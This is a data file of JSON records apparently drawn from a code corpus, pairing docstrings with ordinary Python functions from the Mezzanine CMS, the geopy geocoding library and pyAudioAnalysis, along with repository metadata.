{"docstring": "\"\"\"\nReturn a list of ``Keyword`` objects for the given model instance\nor a model class. In the case of a model class, retrieve all\nkeywords for all instances of the model and apply a ``weight``\nattribute that can be used to create a tag cloud.\n\"\"\"\n\n# Handle a model instance.\n", "func_signal": "def keywords_for(*args):\n", "code": "if isinstance(args[0], Model):\n    obj = args[0]\n    if getattr(obj, \"content_model\", None):\n        obj = obj.get_content_model()\n    keywords_name = obj.get_keywordsfield_name()\n    keywords_queryset = getattr(obj, keywords_name).all()\n    # Keywords may have been prefetched already. If not, we\n    # need select_related for the actual keywords.\n    prefetched = getattr(obj, \"_prefetched_objects_cache\", {})\n    if keywords_name not in prefetched:\n        keywords_queryset = keywords_queryset.select_related(\"keyword\")\n    return [assigned.keyword for assigned in keywords_queryset]\n\n# Handle a model class.\ntry:\n    app_label, model = args[0].split(\".\", 1)\nexcept ValueError:\n    return []\n\ncontent_type = ContentType.objects.get(app_label=app_label, model=model)\nassigned = AssignedKeyword.objects.filter(content_type=content_type)\nkeywords = Keyword.objects.filter(assignments__in=assigned)\nkeywords = keywords.annotate(item_count=Count(\"assignments\"))\nif not keywords:\n    return []\ncounts = [keyword.item_count for keyword in keywords]\nmin_count, max_count = min(counts), max(counts)\nfactor = settings.TAG_CLOUD_SIZES - 1.0\nif min_count != max_count:\n    factor /= max_count - min_count\nfor kywd in keywords:\n    kywd.weight = int(round((kywd.item_count - min_count) * factor)) + 1\nreturn keywords", "path": "mezzanine/mezzanine/generic/templatetags/keyword_tags.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "stephenmcd/mezzanine", "stars": 4697, "license": "bsd-2-clause", "language": "python", "size": 53906}
{"docstring": "\"\"\"\nReturns the profile form defined by\n``settings.ACCOUNTS_PROFILE_FORM_CLASS``.\n\"\"\"\n", "func_signal": "def get_profile_form():\n", "code": "from mezzanine.conf import settings\n\ntry:\n    return import_dotted_path(settings.ACCOUNTS_PROFILE_FORM_CLASS)\nexcept ImportError:\n    raise ImproperlyConfigured(\n        \"Value for ACCOUNTS_PROFILE_FORM_CLASS \"\n        \"could not be imported: %s\" % settings.ACCOUNTS_PROFILE_FORM_CLASS\n    )", "path": "mezzanine/mezzanine/accounts/__init__.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "stephenmcd/mezzanine", "stars": 4697, "license": "bsd-2-clause", "language": "python", "size": 53906}
{"docstring": "# Based on snippet provided on http://docs.disqus.com/developers/sso/\n\n# create a JSON packet of our data attributes\n", "func_signal": "def _get_disqus_sso(user, public_key, secret_key):\n", "code": "data = json.dumps(\n    {\n        \"id\": \"%s\" % user.id,\n        \"username\": user.username,\n        \"email\": user.email,\n    }\n)\n# encode the data to base64\nmessage = base64.b64encode(data.encode(\"utf8\"))\n# generate a timestamp for signing the message\ntimestamp = int(time.time())\n# generate our hmac signature\nsig = hmac.HMAC(\n    secret_key.encode(\"utf8\"),\n    (\"%s %s\" % (message, timestamp)).encode(\"utf8\"),\n    hashlib.sha1,\n).hexdigest()\n\n# Messages are of the form <message> <signature> <timestamp>\nreturn \"%s %s %s\" % (message, sig, timestamp)", "path": "mezzanine/mezzanine/generic/templatetags/disqus_tags.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "stephenmcd/mezzanine", "stars": 4697, "license": "bsd-2-clause", "language": "python", "size": 53906}
{"docstring": "\"\"\"\nTest that an editable setting is always overridden by a settings.py\nsetting of the same name.\n\"\"\"\n\n", "func_signal": "def test_editable_override(self):\n", "code": "settings.clear_cache()\n\nSetting.objects.all().delete()\ndjango_settings.FOO = \"Set in settings.py\"\nSetting.objects.create(name=\"FOO\", value=\"Set in database\")\nfirst_value = settings.FOO\nsettings.SITE_TITLE  # Triggers access?\nsecond_value = settings.FOO\nself.assertEqual(first_value, second_value)", "path": "mezzanine/tests/test_conf.py", "commit_date": "2020-09-09 00:00:00", "repo_name": "stephenmcd/mezzanine", "stars": 4697, "license": "bsd-2-clause", "language": "python", "size": 53906}
{"docstring": "\"\"\"\nTest that accessing any editable setting will delete all Settings\nwith no corresponding registered setting from the database.\n\"\"\"\n\n", "func_signal": "def test_unregistered_setting(self):\n", "code": "settings.clear_cache()\n\nregister_setting(name=\"REGISTERED_SETTING\", editable=True, default=\"\")\nSetting.objects.create(name=\"UNREGISTERED_SETTING\", value=\"\")\n\nwith self.assertRaises(AttributeError):\n    settings.UNREGISTERED_SETTING\n\nqs = Setting.objects.filter(name=\"UNREGISTERED_SETTING\")\nself.assertEqual(qs.count(), 1)\n\n# This triggers Settings._load(), which deletes unregistered Settings\nsettings.REGISTERED_SETTING\n\nself.assertEqual(qs.count(), 0)", "path": "mezzanine/tests/test_conf.py", "commit_date": "2020-09-09 00:00:00", "repo_name": "stephenmcd/mezzanine", "stars": 4697, "license": "bsd-2-clause", "language": "python", "size": 53906}
{"docstring": "\"\"\"\nThis code is copied verbatim from Django's\nTemplateCommand.handle(), but with the directory creation\ncode removed.\n\"\"\"\n# if some directory is given, make sure it's nicely expanded.\n", "func_signal": "def get_project_directory(self, name, target):\n", "code": "if target is None:\n    top_dir = os.path.join(os.getcwd(), name)\nelse:\n    top_dir = os.path.abspath(os.path.expanduser(target))\n    if not os.path.exists(top_dir):\n        raise CommandError(\n            \"Destination directory '%s' does not \"\n            \"exist, please create it first.\" % top_dir\n        )\n\nreturn top_dir", "path": "mezzanine/mezzanine/bin/management/commands/mezzanine_project.py", "commit_date": "2020-09-09 00:00:00", "repo_name": "stephenmcd/mezzanine", "stars": 4697, "license": "bsd-2-clause", "language": "python", "size": 53906}
{"docstring": "\"\"\"\nRemove the temporary folder\n\"\"\"\n", "func_signal": "def pytest_unconfigure():\n", "code": "try:\n    shutil.rmtree(str(TMP_PATH))\nexcept OSError:\n    pass", "path": "mezzanine/tests/conftest.py", "commit_date": "2020-09-09 00:00:00", "repo_name": "stephenmcd/mezzanine", "stars": 4697, "license": "bsd-2-clause", "language": "python", "size": 53906}
{"docstring": "\"\"\"\nReturns site-specific profile for this user. Raises\n``ProfileNotConfigured`` if ``settings.ACCOUNTS_PROFILE_MODEL`` is not\nset, and ``ImproperlyConfigured`` if the corresponding model can't\nbe found.\n\"\"\"\n", "func_signal": "def get_profile_for_user(user):\n", "code": "if not hasattr(user, \"_mezzanine_profile\"):\n    # Raises ProfileNotConfigured if not bool(ACCOUNTS_PROFILE_MODEL)\n    profile_model = get_profile_model()\n    profile_manager = profile_model._default_manager.using(user._state.db)\n\n    user_field = get_profile_user_fieldname(profile_model, user.__class__)\n    profile, created = profile_manager.get_or_create(**{user_field: user})\n\n    profile.user = user\n    user._mezzanine_profile = profile\n\nreturn user._mezzanine_profile", "path": "mezzanine/mezzanine/accounts/__init__.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "stephenmcd/mezzanine", "stars": 4697, "license": "bsd-2-clause", "language": "python", "size": 53906}
{"docstring": "\"\"\"\nProvides a generic context variable which adds single-sign-on\nsupport to DISQUS if ``COMMENTS_DISQUS_API_PUBLIC_KEY`` and\n``COMMENTS_DISQUS_API_SECRET_KEY`` are specified.\n\"\"\"\n", "func_signal": "def disqus_sso_script(context):\n", "code": "settings = context[\"settings\"]\npublic_key = getattr(settings, \"COMMENTS_DISQUS_API_PUBLIC_KEY\", \"\")\nsecret_key = getattr(settings, \"COMMENTS_DISQUS_API_SECRET_KEY\", \"\")\nuser = context[\"request\"].user\nif public_key and secret_key and is_authenticated(user):\n    context[\"public_key\"] = public_key\n    context[\"sso_data\"] = _get_disqus_sso(user, public_key, secret_key)\nreturn context", "path": "mezzanine/mezzanine/generic/templatetags/disqus_tags.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "stephenmcd/mezzanine", "stars": 4697, "license": "bsd-2-clause", "language": "python", "size": 53906}
{"docstring": "\"\"\"\nTest that an editable setting can be overridden with a DB\nvalue and that the data type is preserved when the value is\nreturned back out of the DB. Also checks to ensure no\nunsupported types are defined for editable settings.\n\"\"\"\n\n", "func_signal": "def test_settings(self):\n", "code": "settings.clear_cache()\n\n# Find an editable setting for each supported type.\nnames_by_type = {}\nfor setting in registry.values():\n    if setting[\"editable\"] and setting[\"type\"] not in names_by_type:\n        names_by_type[setting[\"type\"]] = setting[\"name\"]\n# Create a modified value for each setting and save it.\nvalues_by_name = {}\nfor (setting_type, setting_name) in names_by_type.items():\n    setting_value = registry[setting_name][\"default\"]\n    if setting_type in (int, float):\n        setting_value += 1\n    elif setting_type is bool:\n        setting_value = not setting_value\n    elif setting_type is str:\n        setting_value += u\"test\"\n    elif setting_type is bytes:\n        setting_value += b\"test\"\n    else:\n        setting = \"%s: %s\" % (setting_name, setting_type)\n        self.fail(\"Unsupported setting type for %s\" % setting)\n    values_by_name[setting_name] = setting_value\n    Setting.objects.create(name=setting_name, value=setting_value)\n# Load the settings and make sure the DB values have persisted.\nfor (name, value) in values_by_name.items():\n    self.assertEqual(getattr(settings, name), value)", "path": "mezzanine/tests/test_conf.py", "commit_date": "2020-09-09 00:00:00", "repo_name": "stephenmcd/mezzanine", "stars": 4697, "license": "bsd-2-clause", "language": "python", "size": 53906}
{"docstring": "\"\"\"\nGiven a slug, returns a list of pages from ascendants to\ndescendants, that form the parent/child page relationships\nfor that slug. The main concern is to do this in a single\ndatabase query rather than querying the database for parents\nof a given page.\n\nPrimarily used in ``PageMiddleware`` to provide the current\npage, which in the case of non-page views, won't match the\nslug exactly, but will likely match a page that has been\ncreated for linking to the entry point for the app, eg the\nblog page when viewing blog posts.\n\nAlso used within ``Page.get_ascendants``, which gets called\nin the ``pages.views`` view, for building a list of possible\ntemplates that can be used for the page.\n\nIf a valid chain of pages is found, we also assign the pages\nto the ``page._ascendants`` attr of the main/first/deepest\npage, so that when its ``get_ascendants`` method is called,\nthe ascendants chain can be re-used without querying the\ndatabase again. This occurs at least once, given the second\nuse-case described above.\n\"\"\"\n\n", "func_signal": "def with_ascendants_for_slug(self, slug, **kwargs):\n", "code": "if slug == \"/\":\n    slugs = [home_slug()]\nelse:\n    # Create a list of slugs within this slug,\n    # eg: ['about', 'about/team', 'about/team/mike']\n    parts = slug.split(\"/\")\n    slugs = [\"/\".join(parts[:i]) for i in range(1, len(parts) + 1)]\n\n# Find the deepest page that matches one of our slugs.\n# Sorting by \"-slug\" should ensure that the pages are in\n# descendant -> ascendant order.\npages_for_user = self.published(**kwargs)\npages = list(pages_for_user.filter(slug__in=slugs).order_by(\"-slug\"))\nif not pages:\n    return []\n\n# Check to see if the other pages retrieved form a valid path\n# in the page tree, i.e. pages[0].parent == pages[1],\n# pages[1].parent == pages[2], and so on. If they do, assign\n# the ascendants to the main/first/deepest page, so that it\n# can be re-used on calls to its get_ascendants method.\npages[0]._ascendants = []\nfor i, page in enumerate(pages):\n    try:\n        parent = pages[i + 1]\n    except IndexError:\n        # IndexError indicates that this is the last page in\n        # the list, so it should have no parent.\n        if page.parent_id:\n            break  # Invalid parent\n    else:\n        if page.parent_id != parent.id:\n            break  # Invalid parent\nelse:\n    # Valid parents\n    pages[0]._ascendants = pages[1:]\nreturn pages", "path": "mezzanine/mezzanine/pages/managers.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "stephenmcd/mezzanine", "stars": 4697, "license": "bsd-2-clause", "language": "python", "size": 53906}
{"docstring": "\"\"\"\nGet the location, lat, lng and place from a single json place.\n\"\"\"\n# When freeform already so full address\n", "func_signal": "def _parse_place(self, place, is_freeform=None):\n", "code": "if is_freeform == 'true':\n    location = place.get('freeformaddress')\nelse:\n    # For parcelle\n    if place.get('numero'):\n        location = place.get('street')\n    else:\n        # When classic geocoding\n        # or when reverse geocoding\n        location = \"%s %s\" % (\n            place.get('postal_code', ''),\n            place.get('commune', ''),\n        )\n        if place.get('street'):\n            location = \"%s, %s\" % (\n                place.get('street', ''),\n                location,\n            )\n        if place.get('building'):\n            location = \"%s %s\" % (\n                place.get('building', ''),\n                location,\n            )\n\nreturn Location(location, (place.get('lat'), place.get('lng')), place)", "path": "geopy/geopy/geocoders/ignfrance.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "geopy/geopy", "stars": 4222, "license": "mit", "language": "python", "size": 2669}
{"docstring": "\"\"\"Context manager for synchronous adapters. At exit all\nopen connections will be closed.\n\nIn synchronous mode context manager usage is not required,\nand connections will be automatically closed by garbage collection.\n\"\"\"\n", "func_signal": "def __enter__(self):\n", "code": "if self.__run_async:\n    raise TypeError(\"`async with` must be used with async adapters\")\nres = self.adapter.__enter__()\nassert res is self.adapter, \"adapter's __enter__ must return `self`\"\nreturn self", "path": "geopy/geopy/geocoders/base.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "geopy/geopy", "stars": 4222, "license": "mit", "language": "python", "size": 2669}
{"docstring": "\"\"\"\nParse type, words, latitude, and longitude and language from a\nJSON response.\n\"\"\"\n\n", "func_signal": "def _parse_json(self, resources, exactly_one=True):\n", "code": "code = resources['status'].get('code')\n\nif code:\n    # https://docs.what3words.com/api/v2/#errors\n    exc_msg = \"Error returned by What3Words: %s\" % resources['status']['message']\n    if code == 401:\n        raise exc.GeocoderAuthenticationFailure(exc_msg)\n\n    raise exc.GeocoderQueryError(exc_msg)\n\ndef parse_resource(resource):\n    \"\"\"\n    Parse record.\n    \"\"\"\n\n    if 'geometry' in resource:\n        words = resource['words']\n        position = resource['geometry']\n        latitude, longitude = position['lat'], position['lng']\n        if latitude and longitude:\n            latitude = float(latitude)\n            longitude = float(longitude)\n\n        return Location(words, (latitude, longitude), resource)\n    else:\n        raise exc.GeocoderParseError('Error parsing result.')\n\nlocation = parse_resource(resources)\nif exactly_one:\n    return location\nelse:\n    return [location]", "path": "geopy/geopy/geocoders/what3words.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "geopy/geopy", "stars": 4222, "license": "mit", "language": "python", "size": 2669}
{"docstring": "\"\"\"\nSend the request to get raw content.\n\"\"\"\n", "func_signal": "def _request_raw_content(self, url, callback, *, timeout):\n", "code": "headers = {}\nif self.referer is not None:\n    headers['Referer'] = self.referer\n\nif self.username and self.password and self.referer is None:\n    credentials = '{0}:{1}'.format(self.username, self.password).encode()\n    auth_str = base64.standard_b64encode(credentials).decode()\n    headers['Authorization'] = 'Basic {}'.format(auth_str.strip())\n\nreturn self._call_geocoder(\n    url,\n    callback,\n    headers=headers,\n    timeout=timeout,\n    is_json=False,\n)", "path": "geopy/geopy/geocoders/ignfrance.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "geopy/geopy", "stars": 4222, "license": "mit", "language": "python", "size": 2669}
{"docstring": "\"\"\"\nReturns address string from page dictionary\n:param page: dict\n:return: str\n\"\"\"\n", "func_signal": "def _get_address(self, page):\n", "code": "place = page.get('place')\naddress_city = place.get('city')\naddress_country_code = place.get('countryCode')\naddress = join_filter(', ', [address_city, address_country_code])\nreturn address", "path": "geopy/geopy/geocoders/geolake.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "geopy/geopy", "stars": 4222, "license": "mit", "language": "python", "size": 2669}
{"docstring": "# Parse each resource.\n", "func_signal": "def _parse_code(self, place):\n", "code": "latitude = place.get('lat', None)\nlongitude = place.get('lon', None)\nplacename = place.get('display_name', None)\nif latitude is not None and longitude is not None:\n    latitude = float(latitude)\n    longitude = float(longitude)\nreturn Location(placename, (latitude, longitude), place)", "path": "geopy/geopy/geocoders/nominatim.py", "commit_date": "2020-12-20 00:00:00", "repo_name": "geopy/geopy", "stars": 4222, "license": "mit", "language": "python", "size": 2669}
{"docstring": "\"\"\"\nDo the right thing on \"point\" input. For geocoders with reverse\nmethods.\n\"\"\"\n", "func_signal": "def _coerce_point_to_string(self, point, output_format=\"%(lat)s,%(lon)s\"):\n", "code": "if not isinstance(point, Point):\n    point = Point(point)\n\n# Altitude is silently dropped.\n#\n# Geocoding services (almost?) always consider only lat and lon\n# in queries, so altitude doesn't affect the request.\n# A non-zero altitude should not raise an exception\n# though, because PoIs are assumed to span the whole\n# altitude axis (i.e. not just the 0km plane).\nreturn output_format % dict(lat=point.latitude,\n                            lon=point.longitude)", "path": "geopy/geopy/geocoders/base.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "geopy/geopy", "stars": 4222, "license": "mit", "language": "python", "size": 2669}
{"docstring": "# Examples are from the docstring of `Point.from_string`.\n", "func_signal": "def test_point_from_string(self):\n", "code": "self.assertEqual(Point(\"41.5;-81.0\"), (41.5, -81.0, 0.0))\nself.assertEqual(Point(\"41.5,-81.0\"), (41.5, -81.0, 0.0))\nself.assertEqual(Point(\"41.5 -81.0\"), (41.5, -81.0, 0.0))\nself.assertEqual(Point(\"+41.5 -81.0\"), (41.5, -81.0, 0.0))\nself.assertEqual(Point(\"+41.5 +81.0\"), (41.5, 81.0, 0.0))\nself.assertEqual(Point(\"41.5 N -81.0 W\"), (41.5, 81.0, 0.0))\nself.assertEqual(Point(\"-41.5 S;81.0 E\"), (41.5, 81.0, 0.0))\nself.assertEqual(Point(\"23 26m 22s N 23 27m 30s E\"),\n                 (23.439444444444444, 23.458333333333332, 0.0))\nself.assertEqual(Point(\"23 26' 22\\\" N 23 27' 30\\\" E\"),\n                 (23.439444444444444, 23.458333333333332, 0.0))\nself.assertEqual(Point(\"UT: N 39\\xb020' 0'' / W 74\\xb035' 0''\"),\n                 (39.333333333333336, -74.58333333333333, 0.0))", "path": "geopy/test/test_point.py", "commit_date": "2020-12-20 00:00:00", "repo_name": "geopy/geopy", "stars": 4222, "license": "mit", "language": "python", "size": 2669}
{"docstring": "\"\"\"\nValidates error statuses.\n\"\"\"\n", "func_signal": "def _check_status(self, status):\n", "code": "status_code = status['code']\nif status_code == 429:\n    # Rate limit exceeded\n    raise GeocoderQuotaExceeded(\n        'The given key has gone over the requests limit in the 24'\n        ' hour period or has submitted too many requests in too'\n        ' short a period of time.'\n    )\nif status_code == 200:\n    # When there are no results, just return.\n    return\n\nif status_code == 403:\n    raise GeocoderQueryError(\n        'Your request was denied.'\n    )\nelse:\n    raise GeocoderQueryError('Unknown error.')", "path": "geopy/geopy/geocoders/opencage.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "geopy/geopy", "stars": 4222, "license": "mit", "language": "python", "size": 2669}
{"docstring": "\"\"\"\nConstruct geocoding request url. Overridden.\n\n:param str base_api: Geocoding function base address - self.api\n    or self.reverse_api.\n\n:param dict params: Geocoding params.\n\n:return: string URL.\n\"\"\"\n", "func_signal": "def _construct_url(self, base_api, params):\n", "code": "params['key'] = self.api_key\nreturn super()._construct_url(base_api, params)", "path": "geopy/geopy/geocoders/pickpoint.py", "commit_date": "2020-06-27 00:00:00", "repo_name": "geopy/geopy", "stars": 4222, "license": "mit", "language": "python", "size": 2669}
{"docstring": "'''Returns location, (latitude, longitude) from json feed.'''\n\n", "func_signal": "def _parse_json(self, page, exactly_one=True):\n", "code": "places = page.get('results', [])\nif not len(places):\n    self._check_status(page.get('status'))\n    return None\n\ndef parse_place(place):\n    '''Get the location, lat, lng from a single json place.'''\n    location = place.get('formatted')\n    latitude = place['geometry']['lat']\n    longitude = place['geometry']['lng']\n    return Location(location, (latitude, longitude), place)\n\nif exactly_one:\n    return parse_place(places[0])\nelse:\n    return [parse_place(place) for place in places]", "path": "geopy/geopy/geocoders/opencage.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "geopy/geopy", "stars": 4222, "license": "mit", "language": "python", "size": 2669}
{"docstring": "\"\"\"A decorator for geocoder methods which makes the method always run\nunder a lock. The lock is reentrant.\n\nThis decorator transparently handles sync and async working modes.\n\"\"\"\n\n", "func_signal": "def _synchronized(func):\n", "code": "sync_lock = threading.RLock()\n\ndef locked_sync(self, *args, **kwargs):\n    with sync_lock:\n        return func(self, *args, **kwargs)\n\n# At the moment this decorator is evaluated we don't know if we\n# will work in sync or async mode.\n# But we shouldn't create the asyncio Lock in sync mode to avoid\n# unwanted implicit loop initialization.\nasync_lock = None  # asyncio.Lock()\nasync_lock_task = None  # support reentrance\n\nasync def locked_async(self, *args, **kwargs):\n    nonlocal async_lock\n    nonlocal async_lock_task\n\n    if async_lock is None:\n        async_lock = asyncio.Lock()\n\n    if async_lock.locked():\n        assert async_lock_task is not None\n        if compat.current_task() is async_lock_task:\n            res = func(self, *args, **kwargs)\n            if inspect.isawaitable(res):\n                res = await res\n            return res\n\n    async with async_lock:\n        async_lock_task = compat.current_task()\n        try:\n            res = func(self, *args, **kwargs)\n            if inspect.isawaitable(res):\n                res = await res\n            return res\n        finally:\n            async_lock_task = None\n\n@functools.wraps(func)\ndef f(self, *args, **kwargs):\n    run_async = isinstance(self.adapter, BaseAsyncAdapter)\n    if run_async:\n        return locked_async(self, *args, **kwargs)\n    else:\n        return locked_sync(self, *args, **kwargs)\n\nreturn f", "path": "geopy/geopy/geocoders/base.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "geopy/geopy", "stars": 4222, "license": "mit", "language": "python", "size": 2669}
{"docstring": "\"\"\"Remove namespace in the document in place.\"\"\"\n", "func_signal": "def remove_namespace(doc, namespace):\n", "code": "ns = '{%s}' % namespace\nnsl = len(ns)\nfor elem in doc.iter():\n    if elem.tag.startswith(ns):\n        elem.tag = elem.tag[nsl:]", "path": "geopy/geopy/geocoders/ignfrance.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "geopy/geopy", "stars": 4222, "license": "mit", "language": "python", "size": 2669}
{"docstring": "\"\"\"\nTransform the xml ElementTree due to XML webservice return to json\n\"\"\"\n\n", "func_signal": "def _xml_to_json_places(self, tree, is_reverse=False):\n", "code": "select_multi = (\n    'GeocodedAddress'\n    if not is_reverse\n    else 'ReverseGeocodedLocation'\n)\n\nadresses = tree.findall('.//' + select_multi)\nplaces = []\n\nsel_pl = './/Address/Place[@type=\"{}\"]'\nfor adr in adresses:\n    el = {}\n    el['pos'] = adr.find('./Point/pos')\n    el['street'] = adr.find('.//Address/StreetAddress/Street')\n    el['freeformaddress'] = adr.find('.//Address/freeFormAddress')\n    el['municipality'] = adr.find(sel_pl.format('Municipality'))\n    el['numero'] = adr.find(sel_pl.format('Numero'))\n    el['feuille'] = adr.find(sel_pl.format('Feuille'))\n    el['section'] = adr.find(sel_pl.format('Section'))\n    el['departement'] = adr.find(sel_pl.format('Departement'))\n    el['commune_absorbee'] = adr.find(sel_pl.format('CommuneAbsorbee'))\n    el['commune'] = adr.find(sel_pl.format('Commune'))\n    el['insee'] = adr.find(sel_pl.format('INSEE'))\n    el['qualite'] = adr.find(sel_pl.format('Qualite'))\n    el['territoire'] = adr.find(sel_pl.format('Territoire'))\n    el['id'] = adr.find(sel_pl.format('ID'))\n    el['id_tr'] = adr.find(sel_pl.format('ID_TR'))\n    el['bbox'] = adr.find(sel_pl.format('Bbox'))\n    el['nature'] = adr.find(sel_pl.format('Nature'))\n    el['postal_code'] = adr.find('.//Address/PostalCode')\n    el['extended_geocode_match_code'] = adr.find(\n        './/ExtendedGeocodeMatchCode'\n    )\n\n    place = {}\n\n    def testContentAttrib(selector, key):\n        \"\"\"\n        Helper to select by attribute and if not attribute,\n        value set to empty string\n        \"\"\"\n        return selector.attrib.get(\n            key,\n            None\n        ) if selector is not None else None\n\n    place['accuracy'] = testContentAttrib(\n        adr.find('.//GeocodeMatchCode'), 'accuracy')\n\n    place['match_type'] = testContentAttrib(\n        adr.find('.//GeocodeMatchCode'), 'matchType')\n\n    place['building'] = testContentAttrib(\n        adr.find('.//Address/StreetAddress/Building'), 'number')\n\n    place['search_centre_distance'] = testContentAttrib(\n        adr.find('.//SearchCentreDistance'), 'value')\n\n    for key, value in iter(el.items()):\n        if value is not None:\n            place[key] = value.text\n            if value.text is None:\n                place[key] = None\n        else:\n            place[key] = None\n\n    # We check if lat lng is not empty and unpack accordingly\n    if place['pos']:\n        lat, lng = place['pos'].split(' ')\n        place['lat'] = lat.strip()\n        place['lng'] = lng.strip()\n    else:\n        place['lat'] = place['lng'] = None\n\n    # We removed the unused key\n    place.pop(\"pos\", None)\n    places.append(place)\n\nreturn places", "path": "geopy/geopy/geocoders/ignfrance.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "geopy/geopy", "stars": 4222, "license": "mit", "language": "python", "size": 2669}
{"docstring": "# Parse each resource.\n", "func_signal": "def _parse_code(self, feature):\n", "code": "latitude = feature.get('geometry', {}).get('coordinates', [])[1]\nlongitude = feature.get('geometry', {}).get('coordinates', [])[0]\nplacename = feature.get('properties', {}).get('name')\nreturn Location(placename, (latitude, longitude), feature)", "path": "geopy/geopy/geocoders/pelias.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "geopy/geopy", "stars": 4222, "license": "mit", "language": "python", "size": 2669}
{"docstring": "\"\"\"\nCheck query validity with regex\n\"\"\"\n", "func_signal": "def _check_query(self, query):\n", "code": "if not self.multiple_word_re.match(query):\n    return False\nelse:\n    return True", "path": "geopy/geopy/geocoders/what3words.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "geopy/geopy", "stars": 4222, "license": "mit", "language": "python", "size": 2669}
{"docstring": "\"\"\"Returns location, (latitude, longitude) from json feed.\"\"\"\n\n", "func_signal": "def _parse_json(self, page, exactly_one):\n", "code": "if not page.get('success'):\n    return None\n\nlatitude = page['latitude']\nlongitude = page['longitude']\n\naddress = self._get_address(page)\nresult = Location(address, (latitude, longitude), page)\nif exactly_one:\n    return result\nelse:\n    return [result]", "path": "geopy/geopy/geocoders/geolake.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "geopy/geopy", "stars": 4222, "license": "mit", "language": "python", "size": 2669}
{"docstring": "'''Returns location, (latitude, longitude) from json feed.'''\n", "func_signal": "def _parse_json(self, json, exactly_one=True):\n", "code": "features = json['features']\nif features == []:\n    return None\n\ndef parse_feature(feature):\n    location = feature['place_name']\n    longitude = feature['geometry']['coordinates'][0]\n    latitude = feature['geometry']['coordinates'][1]\n    return Location(location, (latitude, longitude), feature)\nif exactly_one:\n    return parse_feature(features[0])\nelse:\n    return [parse_feature(feature) for feature in features]", "path": "geopy/geopy/geocoders/mapbox.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "geopy/geopy", "stars": 4222, "license": "mit", "language": "python", "size": 2669}
{"docstring": "\"\"\"\nParse a location name, latitude, and longitude from an JSON response.\n\"\"\"\n", "func_signal": "def _parse_json(self, doc, exactly_one=True):\n", "code": "status_code = doc.get(\"statusCode\", 200)\nif status_code != 200:\n    err = doc.get(\"errorDetails\", \"\")\n    if status_code == 401:\n        raise GeocoderAuthenticationFailure(err)\n    elif status_code == 403:\n        raise GeocoderInsufficientPrivileges(err)\n    elif status_code == 429:\n        raise GeocoderQuotaExceeded(err)\n    elif status_code == 503:\n        raise GeocoderUnavailable(err)\n    else:\n        raise GeocoderServiceError(err)\n\ntry:\n    resources = doc['Response']['View'][0]['Result']\nexcept IndexError:\n    resources = None\nif not resources:\n    return None\n\ndef parse_resource(resource):\n    \"\"\"\n    Parse each return object.\n    \"\"\"\n    stripchars = \", \\n\"\n    addr = resource['Location']['Address']\n\n    address = addr.get('Label', '').strip(stripchars)\n    city = addr.get('City', '').strip(stripchars)\n    state = addr.get('State', '').strip(stripchars)\n    zipcode = addr.get('PostalCode', '').strip(stripchars)\n    country = addr.get('Country', '').strip(stripchars)\n\n    city_state = join_filter(\", \", [city, state])\n    place = join_filter(\" \", [city_state, zipcode])\n    location = join_filter(\", \", [address, place, country])\n\n    display_pos = resource['Location']['DisplayPosition']\n    latitude = float(display_pos['Latitude'])\n    longitude = float(display_pos['Longitude'])\n\n    return Location(location, (latitude, longitude), resource)\n\nif exactly_one:\n    return parse_resource(resources[0])\nelse:\n    return [parse_resource(resource) for resource in resources]", "path": "geopy/geopy/geocoders/here.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "geopy/geopy", "stars": 4222, "license": "mit", "language": "python", "size": 2669}
{"docstring": "\"\"\"\nParse JSON response body.\n\"\"\"\n", "func_signal": "def _parse_json(self, doc, exactly_one):\n", "code": "if doc.get('error'):\n    raise GeocoderServiceError(doc['error']['message'])\n\ntry:\n    places = doc['response']['GeoObjectCollection']['featureMember']\nexcept KeyError:\n    raise GeocoderParseError('Failed to parse server response')\n\ndef parse_code(place):\n    \"\"\"\n    Parse each record.\n    \"\"\"\n    try:\n        place = place['GeoObject']\n    except KeyError:\n        raise GeocoderParseError('Failed to parse server response')\n\n    longitude, latitude = [\n        float(_) for _ in place['Point']['pos'].split(' ')\n    ]\n\n    name_elements = ['name', 'description']\n    location = ', '.join([place[k] for k in name_elements if place.get(k)])\n\n    return Location(location, (latitude, longitude), place)\n\nif exactly_one:\n    try:\n        return parse_code(places[0])\n    except IndexError:\n        return None\nelse:\n    return [parse_code(place) for place in places]", "path": "geopy/geopy/geocoders/yandex.py", "commit_date": "2020-12-20 00:00:00", "repo_name": "geopy/geopy", "stars": 4222, "license": "mit", "language": "python", "size": 2669}
{"docstring": "\"\"\"Computes zero crossing rate of frame\"\"\"\n", "func_signal": "def zero_crossing_rate(frame):\n", "code": "count = len(frame)\ncount_zero = np.sum(np.abs(np.diff(np.sign(frame)))) / 2\nreturn np.float64(count_zero) / np.float64(count - 1.0)", "path": "pyAudioAnalysis/pyAudioAnalysis/ShortTermFeatures.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "tyiannak/pyAudioAnalysis", "stars": 5608, "license": "apache-2.0", "language": "python", "size": 171627}
